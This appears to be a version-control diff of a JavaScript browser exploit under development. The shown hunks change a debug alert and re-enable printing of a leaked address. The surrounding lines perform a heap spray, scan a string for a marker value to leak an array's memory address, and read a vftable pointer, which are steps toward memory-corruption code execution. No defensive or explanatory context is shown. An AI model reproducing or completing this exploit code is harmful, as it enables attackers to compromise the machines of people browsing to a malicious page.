@@ -1,5 +1,5 @@
 <script>	
-alert("start20");
+alert("start21");
 var spray=new Array(0x800);
 var tmp;
  for(var i=0;i<spray.length;i+=2){
@@ -95,7 +95,7 @@ while(s1.charCodeAt(a)!=0xFFFB){
  a+=1;
 }
 var arr_addr=(s1.charCodeAt(a-1)<<16)+s1.charCodeAt(a-2)
-//alert(arr_addr.toString(16));
+alert(arr_addr.toString(16));
 a=arr_addr/2;
 var vftable=s1.charCodeAt(a)+(s1.charCodeAt(a+1)<<16);
 //alert(vftable.toString(16));
